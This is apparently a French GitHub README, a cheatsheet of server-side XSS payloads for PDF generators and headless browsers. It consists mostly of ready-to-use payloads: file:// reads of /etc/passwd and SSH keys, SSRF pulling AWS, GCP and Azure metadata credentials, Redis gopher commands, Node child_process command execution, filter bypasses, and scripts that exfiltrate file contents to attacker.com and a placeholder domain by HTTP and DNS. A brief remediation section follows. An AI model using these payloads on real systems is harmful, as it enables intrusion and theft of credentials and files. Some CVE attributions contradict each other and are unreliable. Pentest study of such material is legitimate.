# 🔥 XSS Server-Side Injection Cheatsheet

> **Guide pratique des injections XSS côté serveur** — PDF generators, headless browsers, screenshot services, crawlers, mail parsers, et plus.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Made with ❤️](https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-red.svg)]()
[![Security](https://img.shields.io/badge/Category-Web%20Security-red.svg)]()
[![Offensive](https://img.shields.io/badge/Usage-Offensive%20Security-orange.svg)]()

---

## 📚 Table des matières

- [Introduction](#-introduction)
- [Qu'est-ce qu'un XSS Server-Side ?](#-quest-ce-quun-xss-server-side-)
- [Contexte d'exploitation](#-contexte-dexploitation)
- [1. Lecture de fichiers locaux](#-1-lecture-de-fichiers-locaux-file-read)
- [2. SSRF interne](#-2-ssrf-interne)
- [3. Exécution JavaScript](#-3-exécution-javascript)
- [4. Contournement de filtres](#-4-contournement-de-filtres)
- [5. Extraction de données](#-5-extraction-de-données)
- [6. Payloads spécifiques par moteur](#-6-payloads-spécifiques-par-moteur)
- [Détection et reconnaissance](#-détection-et-reconnaissance)
- [Remédiation](#-remédiation)
- [Ressources](#-ressources)
- [Licence](#-licence)

---

## 🎯 Introduction

Ce dépôt regroupe un ensemble de **payloads, techniques et méthodologies** pour identifier et exploiter les vulnérabilités **XSS côté serveur**.

Contrairement aux XSS classiques qui s'exécutent dans le navigateur d'une victime, un **XSS Server-Side** s'exécute dans un **moteur de rendu headless** (Chrome Headless, wkhtmltopdf, Puppeteer, PhantomJS, etc.) qui tourne sur le serveur. L'attaquant peut alors :

- 📂 **Lire des fichiers système** (`/etc/passwd`, `/flag.txt`, `.env`, clés SSH…)
- 🌐 **Accéder au réseau interne** (SSRF)
- ⚙️ **Exécuter du code** dans certains cas
- 🚪 **Pivoter vers d'autres services** (Redis, MySQL, API internes)

> ⚠️ **Usage légal uniquement** — Ce guide est destiné aux pentesters, bug bounty hunters, et développeurs souhaitant sécuriser leurs applications. Ne jamais utiliser ces techniques sans autorisation écrite.

---

## 🧠 Qu'est-ce qu'un XSS Server-Side ?

### Le pipeline classique

```
[ Utilisateur ] → [ Formulaire ] → [ Serveur ]
                                       │
                                       ▼
                            ┌──────────────────────┐
                            │ Template HTML (EJS,  │
                            │ Jinja, Twig, Blade…) │
                            │ + données user       │
                            └──────────┬───────────┘
                                       │
                                       ▼
                            ┌──────────────────────┐
                            │ Moteur headless      │
                            │ (wkhtmltopdf,        │
                            │  Chrome Headless,    │
                            │  Puppeteer, etc.)    │
                            └──────────┬───────────┘
                                       │
                                       ▼
                                [ PDF / PNG / HTML ]
```

### Le point clé

À l'étape du **moteur headless**, un **vrai navigateur** interprète le HTML — mais il tourne **sur le serveur**, avec les droits du serveur. Toute balise HTML dangereuse devient une porte d'entrée.

### Différence avec un XSS classique

| Critère | XSS classique | XSS Server-Side |
|---------|---------------|-----------------|
| **Cible** | Navigateur d'une victime | Serveur (moteur de rendu) |
| **Exécution** | JS dans le navigateur | HTML/JS dans un headless |
| **Portée** | Cookies, session | Fichiers système, réseau interne |
| **Payload typique** | `<script>alert(1)</script>` | `<iframe src=file:///...>` |
| **Gravité** | Moyenne à haute | **Critique** (RCE possible) |
| **Détection** | WAF, CSP | Difficile (payload stocké) |

---

## 🎯 Contexte d'exploitation

Les XSS Server-Side se rencontrent typiquement dans :

| Fonctionnalité | Moteur typique | Risque |
|----------------|----------------|--------|
| Génération de factures PDF | wkhtmltopdf, dompdf | Lecture de fichiers |
| Certificats / attestations | Puppeteer, Chrome Headless | RCE, SSRF |
| Aperçu de liens (link preview) | OpenGraph parsers | SSRF |
| Screenshot de site web | PhantomJS, Puppeteer | SSRF, file read |
| Newsletter HTML | Moteurs de mail | Fuite de données |
| Export CSV/Excel | LibreOffice headless | Macro execution |
| Crawlers / bots | Selenium, Playwright | SSRF, RCE |

---

## 📂 1. Lecture de fichiers locaux (File Read)

Techniques pour lire un fichier sur le serveur via le moteur de rendu.

### 1.1 — `<iframe>` basique

```html
<iframe src=file:///flag.txt></iframe>
```

- **Description** : Charge un fichier local via le protocole `file://`
- **Quand l'utiliser** : Quand le moteur accepte `<iframe>` et n'a pas désactivé `file://`
- **Cibles classiques** : `/flag.txt`, `/etc/passwd`, `/proc/self/environ`, `.env`

### 1.2 — `<iframe>` avec dimensions

```html
<iframe src='file:///etc/passwd' width=1000 height=1000></iframe>
```

- **Description** : Force l'affichage même si l'iframe est masquée
- **Quand l'utiliser** : Quand le fichier est lu mais pas visible dans le PDF (iframe 0x0)

### 1.3 — `<object>`

```html
<object data=file:///etc/passwd></object>
```

- **Description** : Alternative à `<iframe>`
- **Quand l'utiliser** : Si `<iframe>` est filtré mais pas `<object>`

### 1.4 — `<embed>`

```html
<embed src=file:///etc/passwd>
```

- **Description** : Balise HTML5, souvent oubliée des filtres
- **Quand l'utiliser** : Si `<iframe>` et `<object>` sont filtrés

### 1.5 — `<link rel=attachment>`

```html
<link rel=attachment href="file:///flag.txt">
```

- **Description** : Attache le fichier au PDF (extractible après coup)
- **Quand l'utiliser** : Quand les iframes ne rendent rien mais que le PDF peut attacher
- **Extraction** : `pdfdetach -save 1 -o flag.txt attestation.pdf`

### 1.6 — `<meta http-equiv=refresh>`

```html
<meta http-equiv="refresh" content="0;url=file:///flag.txt">
```

- **Description** : Redirection automatique vers un fichier local
- **Quand l'utiliser** : Quand le moteur suit les redirections

### 1.7 — `<img src=file://...>`

```html
<img src="file:///flag.txt">
```

- **Description** : Tente de charger le fichier comme image
- **Quand l'utiliser** : Pour tester si `file://` est autorisé (différence entre 404 et erreur de parsing)

### 1.8 — SVG inline

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="file:///flag.txt"/>
</svg>
```

- **Description** : SVG peut référencer des ressources locales
- **Quand l'utiliser** : Quand les balises HTML classiques sont filtrées

---

## 🌐 2. SSRF interne

Utilise le moteur de rendu pour atteindre des services internes.

### 2.1 — Accès à un service localhost

```html
<iframe src=http://127.0.0.1:8080/admin></iframe>
```

- **Description** : Contourne les restrictions d'accès externe
- **Quand l'utiliser** : Pour cartographier les services internes

### 2.2 — Métadonnées AWS

```html
<iframe src=http://169.254.169.254/latest/meta-data/iam/security-credentials/></iframe>
```

- **Description** : Récupère les credentials IAM d'une instance EC2
- **Quand l'utiliser** : Si le serveur tourne sur AWS (très fréquent en prod)

### 2.3 — Métadonnées GCP

```html
<iframe src=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token></iframe>
```

- **Description** : Récupère le token de service account GCP
- **Quand l'utiliser** : Si le serveur tourne sur GCP
- **Note** : Nécessite le header `Metadata-Flavor: Google` — utiliser `<script>` à la place

### 2.4 — Métadonnées Azure

```html
<iframe src=http://169.254.169.254/metadata/instance?api-version=2021-02-01></iframe>
```

- **Description** : Récupère les infos de l'instance Azure
- **Quand l'utiliser** : Si le serveur tourne sur Azure

### 2.5 — Scan de ports internes

```html
<iframe src=http://127.0.0.1:6379></iframe>
<iframe src=http://127.0.0.1:3306></iframe>
<iframe src=http://127.0.0.1:9200></iframe>
```

- **Description** : Détecte les services internes (Redis, MySQL, Elasticsearch…)
- **Quand l'utiliser** : Pour cartographier le réseau
- **Astuce** : Comparer les temps de réponse (open vs closed port)

### 2.6 — Attaque Redis via gopher

```html
<iframe src=gopher://127.0.0.1:6379/_SET%20foo%20bar%0D%0A></iframe>
```

- **Description** : Envoie des commandes Redis directement
- **Quand l'utiliser** : Si Redis est interne et non protégé (RCE possible via `MODULE LOAD`)

### 2.7 — Accès à un bucket S3 privé

```html
<iframe src=http://bucket-internal.s3.amazonaws.com/secret.txt></iframe>
```

- **Description** : Accède à un bucket S3 interne
- **Quand l'utiliser** : Si le serveur a des credentials S3

---

## ⚡ 3. Exécution JavaScript

Payloads qui exécutent du JS dans le moteur headless.

### 3.1 — Fetch + affichage

```html
<script>
fetch('file:///flag.txt')
  .then(r => r.text())
  .then(t => document.body.innerHTML = '<pre>' + t + '</pre>');
</script>
```

- **Description** : Lit un fichier local et l'affiche dans le PDF
- **Quand l'utiliser** : Si JavaScript est activé dans le moteur
- **Note** : Chrome Headless moderne bloque `file://` en JS sans flag `--allow-file-access-from-files`

### 3.2 — XHR synchrone

```html
<script>
var x = new XMLHttpRequest();
x.open('GET', 'file:///etc/passwd', false);
x.send();
document.write('<pre>' + x.responseText + '</pre>');
</script>
```

- **Description** : Variante XHR pour vieux moteurs
- **Quand l'utiliser** : Si `fetch` n'est pas supporté (PhantomJS, vieux WebKit)

### 3.3 — Exfiltration HTTP

```html
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => new Image().src = 'http://VOTRE_DOMAINE/?d=' + encodeURIComponent(t));
</script>
```

- **Description** : Exfiltre le contenu vers un serveur attaquant
- **Quand l'utiliser** : Quand on veut récupérer le fichier sans accès au PDF
- **Prérequis** : Serveur attaquant accessible depuis le serveur cible

### 3.4 — Exfiltration DNS

```html
<script>
fetch('file:///flag.txt')
  .then(r => r.text())
  .then(t => {
    location = 'http://' + btoa(t).slice(0, 50) + '.VOTRE_DOMAINE/';
  });
</script>
```

- **Description** : Exfiltration via DNS (contourne les firewalls HTTP)
- **Quand l'utiliser** : Si les connexions HTTP sortantes sont bloquées
- **Prérequis** : Un domaine avec un serveur DNS qui log les requêtes (Burp Collaborator, interactsh)

### 3.5 — Lecture de cookies/session

```html
<script>
fetch('http://127.0.0.1:8080/admin', { credentials: 'include' })
  .then(r => r.text())
  .then(t => document.body.innerHTML = '<pre>' + t + '</pre>');
</script>
```

- **Description** : Utilise les cookies du moteur pour accéder à un endpoint admin
- **Quand l'utiliser** : Si le moteur est authentifié sur un autre service interne

### 3.6 — RCE via Node.js (Chromium headless avec Node integration)

```html
<script>
  require('child_process').exec('id', (e, out) => {
    document.body.innerHTML = '<pre>' + out + '</pre>';
  });
</script>
```

- **Description** : Exécute une commande système
- **Quand l'utiliser** : Si le moteur est Electron avec `nodeIntegration: true` (rare mais critique)

### 3.7 — RCE via wkhtmltopdf (CVE-2020-5496)

```html
<script>
  var x = new XMLHttpRequest();
  x.open('GET', 'file:///etc/passwd', false);
  x.send();
  document.write(x.responseText);
</script>
```

- **Description** : wkhtmltopdf < 0.12.5 était vulnérable à la lecture de fichiers
- **Quand l'utiliser** : Sur des versions anciennes non patchées

---

## 🛡️ 4. Contournement de filtres

Payloads pour bypasser les filtres naïfs.

### 4.1 — Cas mixte

```html
<IfRaMe SrC=file:///flag.txt></IfRaMe>
```

- **Description** : Casse aléatoire pour tromper un regex naïf
- **Quand l'utiliser** : Filtre sensible à la casse uniquement

### 4.2 — Commentaire HTML

```html
<ifr<!--test-->ame src=file:///flag.txt></iframe>
```

- **Description** : Commentaire pour casser la chaîne `<iframe`
- **Quand l'utiliser** : Filtre cherchant `'<iframe'` littéralement

### 4.3 — Null byte

```html
<iframe src=file:///flag.txt%00></iframe>
```

- **Description** : Null byte pour tromper les vieux parseurs
- **Quand l'utiliser** : PHP < 5.3.4, vieux C

### 4.4 — Entités HTML

```html
<iframe src=&#102;ile:///flag.txt></iframe>
```

- **Description** : Encode `f` en `&#102;`
- **Quand l'utiliser** : Filtre cherchant `file://` en clair

### 4.5 — Double encodage URL

```html
<iframe src=%66%69%6c%65%3a%2f%2f%2fflag.txt></iframe>
```

- **Description** : Encode `file://` en URL-encoded
- **Quand l'utiliser** : Filtre qui décode une fois avant de vérifier

### 4.6 — Balises alternatives

```html
<svg onload=fetch('file:///flag.txt')>
<img src=x onerror=fetch('file:///flag.txt')>
<body onload=fetch('file:///flag.txt')>
<input autofocus onfocus=fetch('file:///flag.txt')>
<details open ontoggle=fetch('file:///flag.txt')>
```

- **Description** : Event handlers sur balises autorisées
- **Quand l'utiliser** : Si `<script>` est filtré

### 4.7 — srcdoc

```html
<iframe srcdoc='<script>fetch("file:///flag.txt")</script>'></iframe>
```

- **Description** : Injection inline dans une iframe
- **Quand l'utiliser** : Si les `src` externes sont filtrés mais `srcdoc` autorisé

### 4.8 — Base64 Data URI

```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

- **Description** : Contenu en base64 pour tromper le filtre
- **Quand l'utiliser** : Filtre scannant les balises internes

### 4.9 — `<math>` + mXSS

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('file:///flag.txt')>
```

- **Description** : Mutation XSS via parsing HTML5
- **Quand l'utiliser** : Filtres basés sur DOMPurify ancien

### 4.10 — `<noscript>` bypass

```html
<noscript><p title="</noscript><img src=x onerror=fetch('file:///flag.txt')>">
```

- **Description** : Contourne les filtres qui ignorent le contenu de `<noscript>`
- **Quand l'utiliser** : Sanitizers qui suppriment `<noscript>` sans traiter son contenu

---

## 📤 5. Extraction de données

Techniques pour récupérer les données lues.

### 5.1 — Extraction directe (PDF)

```html
<iframe src=file:///flag.txt></iframe>
```

- **Description** : Le flag apparaît directement dans le PDF généré
- **Quand l'utiliser** : Toujours en premier

### 5.2 — Extraction via pièce jointe

```html
<link rel=attachment href="file:///flag.txt">
```

- **Description** : Attache le fichier au PDF
- **Extraction** :
  ```bash
  pdfdetach -save 1 -o flag.txt file.pdf
  strings file.pdf | grep -i flag
  ```

### 5.3 — Extraction via erreur de parsing

```html
<iframe src="file:///flag.txt#<img src=x onerror=fetch('http://attacker.com/?d='+encodeURIComponent(this.contentDocument.body.innerText))>"></iframe>
```

- **Description** : Exfiltre via une erreur JS
- **Quand l'utiliser** : Si le PDF n'est pas accessible directement

### 5.4 — Extraction via serveur attaquant

```html
<script>
new Image().src='http://attacker.com/log?f='+encodeURIComponent(document.body.innerHTML);
</script>
```

- **Description** : Envoie le contenu à un serveur contrôlé
- **Prérequis** : Serveur accessible (ngrok, VPS, Burp Collaborator)

### 5.5 — Extraction via timing

```html
<script>
var t0 = Date.now();
fetch('file:///flag.txt').then(() => {
  new Image().src = 'http://attacker.com/?time=' + (Date.now() - t0);
});
</script>
```

- **Description** : Mesure le temps de lecture (blind)
- **Quand l'utiliser** : Si le contenu n'est pas accessible directement

---

## 🔧 6. Payloads spécifiques par moteur

### 6.1 — wkhtmltopdf

```html
<iframe src=file:///etc/passwd></iframe>
<iframe src=file:///flag.txt></iframe>
```

- **Versions vulnérables** : < 0.12.5 (CVE-2020-5496)
- **Flag défensif** : `--disable-local-file-access`

### 6.2 — Chrome Headless (Puppeteer, Playwright)

```html
<iframe src="file:///etc/passwd"></iframe>
```

- **Versions vulnérables** : Toutes sans flag `--disable-web-security` + `--allow-file-access-from-files`
- **Note** : Chrome moderne bloque `file://` par défaut dans les iframes

### 6.3 — PhantomJS

```html
<script>
var page = require('webpage').create();
page.open('file:///etc/passwd', function() {
  console.log(page.content);
  phantom.exit();
});
</script>
```

- **Note** : PhantomJS est abandonné mais encore utilisé
- **Vulnérabilité** : Accès complet au système de fichiers

### 6.4 — dompdf (PHP)

```html
<iframe src=file:///etc/passwd></iframe>
```

- **CVE** : CVE-2020-5496 (RCE), CVE-2021-3838
- **Versions vulnérables** : < 2.0.0

### 6.5 — tcpdf / mpdf (PHP)

```html
<img src="file:///etc/passwd">
```

- **Note** : Nécessite des options spécifiques activées
- **Recommandation** : Utiliser `$mpdf->SetBasePath()` correctement

### 6.6 — Puppeteer avec `--allow-file-access-from-files`

```html
<iframe src=file:///flag.txt></iframe>
```

- **Note** : Si le flag est activé, tout est lisible
- **Détection** : Tester avec `/etc/passwd`

### 6.7 — LibreOffice headless (convert-to pdf)

```html
<iframe src=file:///etc/passwd></iframe>
```

- **Note** : LibreOffice interprète le HTML mais bloque `file://` par défaut

---

## 🔍 Détection et reconnaissance

### Étape 1 : Identifier le moteur

Injecter :

```html
<meta name="generator" content="wkhtmltopdf">
```

Ou observer les headers HTTP, les métadonnées PDF (`pdfinfo`), les timestamps.

### Étape 2 : Tester les balises

| Test | Payload | Résultat |
|------|---------|----------|
| HTML basique | `<b>test</b>` | Vérifie si le HTML est interprété |
| iframe | `<iframe src=file:///etc/hostname></iframe>` | Teste `file://` |
| script | `<script>alert(1)</script>` | Teste JS |
| img | `<img src=x onerror=alert(1)>` | Teste les event handlers |
| SSRF | `<iframe src=http://127.0.0.1:8080></iframe>` | Teste l'accès interne |

### Étape 3 : Confirmer la vulnérabilité

- **Lecture de fichier** : `/etc/hostname` (contient le hostname, toujours lisible)
- **SSRF** : `http://169.254.169.254/` (AWS metadata)
- **RCE** : `file:///proc/self/cmdline` (montre la commande du processus)

### Étape 4 : Énumération

```html
<iframe src=file:///etc/passwd></iframe>
<iframe src=file:///etc/hosts></iframe>
<iframe src=file:///proc/self/environ></iframe>
<iframe src=file:///proc/self/cmdline></iframe>
<iframe src=file:///var/www/html/config.php></iframe>
<iframe src=file:///home/user/.ssh/id_rsa></iframe>
<iframe src=file:///root/.bash_history></iframe>
```

---

## 🛡️ Remédiation

### 1. Échapper les entrées utilisateur

```python
# ❌ Vulnérable
html = f"<h1>{first_name} {last_name}</h1>"

# ✅ Sécurisé
from html import escape
html = f"<h1>{escape(first_name)} {escape(last_name)}</h1>"
```

### 2. Désactiver les fonctionnalités dangereuses

**wkhtmltopdf** :

```bash
wkhtmltopdf \
  --disable-javascript \
  --disable-local-file-access \
  --disable-smart-shrinking \
  --no-outline \
  input.html output.pdf
```

**Chrome Headless** :

```bash
chrome --headless \
  --disable-gpu \
  --no-sandbox \
  --disable-dev-shm-usage \
  --disable-features=NetworkService \
  --disable-web-security=false \
  --print-to-pdf=output.pdf \
  input.html
```

**Puppeteer** :

```javascript
await page.setRequestInterception(true);
page.on('request', req => {
  if (req.url().startsWith('file://') || req.url().startsWith('http://169.254.')) {
    req.abort();
  } else {
    req.continue();
  }
});
```

### 3. Sandboxer le moteur

- Utilisateur non-root dédié
- Conteneur Docker avec `--read-only`
- Pas de montage de `/etc`, `/home`, `/root`
- Seccomp profile restrictif
- Namespace réseau isolé

### 4. Filtrer les URLs

```python
import re
ALLOWED_SCHEMES = ["http", "https"]

def is_safe_url(url):
    return any(url.startswith(s + "://") for s in ALLOWED_SCHEMES)
```

### 5. Bloquer les IPs privées (anti-SSRF)

```python
import ipaddress
import socket

def is_private_ip(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        return ipaddress.ip_address(ip).is_private
    except:
        return True
```

### 6. Content Security Policy

```http
Content-Security-Policy: default-src 'self'; script-src 'none'; object-src 'none'; frame-src 'none';
```

### 7. Validation par liste blanche

```python
import re
if not re.match(r'^[a-zA-Z0-9\s\-]{1,50}$', first_name):
    raise ValueError("Invalid name")
```

---

## 📚 Ressources

### Articles et whitepapers

- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [CWE-918 — SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-79 — XSS](https://cwe.mitre.org/data/definitions/79.html)
- [PDF Generator Vulnerabilities — YesWeHack](https://blog.yeswehack.com/yeswerhackers/pdf-generator-vulnerabilities/)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

### CVE notables

| CVE | Cible | Impact |
|-----|-------|--------|
| CVE-2020-5496 | dompdf | RCE |
| CVE-2018-1000648 | wkhtmltopdf | File read |
| CVE-2021-3838 | dompdf | SSRF |
| CVE-2022-24828 | Composer | RCE |
| CVE-2023-25166 | wkhtmltopdf | SSRF |

### Outils

- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) — Détection OOB
- [interactsh](https://github.com/projectdiscovery/interactsh) — Alternative open source
- [pdfdetach](https://poppler.freedesktop.org/) — Extraction de pièces jointes PDF
- [pdfinfo](https://poppler.freedesktop.org/) — Métadonnées PDF

### Labs d'entraînement

- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf)
- [HackTheBox — Challenges Web](https://www.hackthebox.com/)
- [TryHackMe — SSRF](https://tryhackme.com/)

---

## 📄 Licence

Ce projet est sous licence **MIT**. Voir [LICENSE](LICENSE) pour plus de détails.

---

## ⚠️ Avertissement

Ce contenu est fourni **à des fins éducatives et de recherche en sécurité uniquement**. Toute utilisation contre des systèmes sans autorisation écrite préalable est **strictement illégale** et peut entraîner des poursuites pénales.

L'auteur décline toute responsabilité quant à l'utilisation abusive de ces informations.

---

<p align="center">
  <b>⭐ Si ce guide t'a aidé, mets une étoile sur le repo ! ⭐</b>
</p>
